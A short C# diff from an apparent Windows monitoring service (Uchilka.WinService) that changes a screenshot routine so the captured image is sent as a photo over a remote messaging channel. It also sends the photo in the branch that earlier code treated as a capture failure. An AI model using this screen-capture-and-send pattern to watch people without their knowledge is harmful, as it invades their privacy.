@@ -49,7 +49,11 @@ namespace Uchilka.WinService
 
             if (TakeScreenShot(targetDir, fileName) == 0)
             {
-                _commChannel.SendTextMessage("ERROR: take screen capture failed");
+                using (var stream = new FileStream(Path.Combine(targetDir, fileName), FileMode.Open))
+                {
+                    _commChannel.SendTextMessage($"Sending photo: {fileName}");
+                    _commChannel.SendPhotoMessage(stream, fileName);
+                }
             }
             else
             {
